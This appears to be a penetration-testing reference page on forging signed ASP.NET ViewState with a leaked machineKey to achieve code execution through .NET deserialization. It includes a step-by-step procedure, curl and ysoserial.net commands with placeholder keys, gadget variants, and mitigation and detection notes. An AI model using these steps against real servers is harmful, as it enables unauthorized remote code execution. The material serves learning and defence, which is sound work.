---
topic: ASP.NET — ViewState and machineKey
tags: [windows, aspnet, viewstate, machinekey, deserialization]
---

# ASP.NET — ViewState and machineKey

**English** | [🌐 Español](aspnet-viewstate-machinekey.md)

## Concept

ASP.NET stores control state in a signed and sometimes encrypted ViewState. If `web.config` leaks `machineKey`, arbitrary ViewState can be signed with the server keys. ViewState is deserialized and can execute code through .NET gadgets.

## When it applies

- The application uses Web Forms with ViewState enabled.
- `web.config` can be read or `validationKey` and `decryptionKey` recovered.
- The server accepts signed ViewState without an additional MAC.

## Procedure

1. Read `web.config` through LFI, a backup or `.shtml` upload.
2. Extract `validationKey`, `decryptionKey` and algorithms.
3. Generate a ViewState with `ysoserial.net`.
4. Send it to the vulnerable page and verify execution.

## Commands

```bash
# Read web.config
curl -s "http://<HOST>/view.shtml"
# Generate signed ViewState
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c whoami" --path="/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="<KEY>" --validationalg="SHA1" --validationkey="<KEY>"
curl -s -X POST http://<HOST>/default.aspx --data-urlencode "__VIEWSTATE=<PAYLOAD>"
```

## Variants

- Use the `TypeConfuseDelegate` or `ObjectDataProvider` gadget.
- Sign only when `enableViewStateMac` is disabled.
- Combine it with a padding oracle to recover the key.

## Limitations

- A rotated `machineKey` invalidates the generated ViewState.
- The gadget must exist in the server runtime.
- IIS may reject ViewState without a MAC.

## Mitigation

- Rotate `machineKey` and do not expose `web.config`.
- Disable ViewState when unused and validate the MAC.
- Block `.shtml` and review deserialization.

## Detection

- ViewState not starting with the expected format.
- Requests with very large or repeated ViewState.
- IIS processes spawning `cmd` or PowerShell.

## References

- [Microsoft — machineKey](https://learn.microsoft.com/en-us/iis/configuration/system.web/machinekey)
- [ysoserial.net — GitHub](https://github.com/pwntester/ysoserial.net)
- [0xdf — Perspective](https://0xdf.gitlab.io/2022/10/15/htb-perspective.html)
